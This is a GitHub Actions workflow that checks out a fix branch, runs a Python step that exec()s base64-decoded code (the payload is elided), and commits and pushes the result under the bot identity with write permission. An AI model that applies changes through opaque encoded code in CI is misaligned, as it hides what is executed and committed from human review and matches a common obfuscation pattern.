name: Temporary quest navigation and selection fix

on:
  push:
    branches: [main]
    paths:
      - .github/workflows/tmp-fix-quest-navigation-selection.yml

permissions:
  contents: write

jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: fix/quest-navigation-and-selection-balance
          fetch-depth: 0
      - name: Apply patch
        run: python -c "import base64; exec(base64.b64decode('...'))" 
      - name: Commit changes
        run: |
          git config user.name github-actions[bot]
          git config user.email 41898282+github-actions[bot]@users.noreply.github.com
          git add kspaccountbuilder
          git commit -m "Fix quest navigation churn and rebalance task selection"
          git push origin HEAD:fix/quest-navigation-and-selection-balance
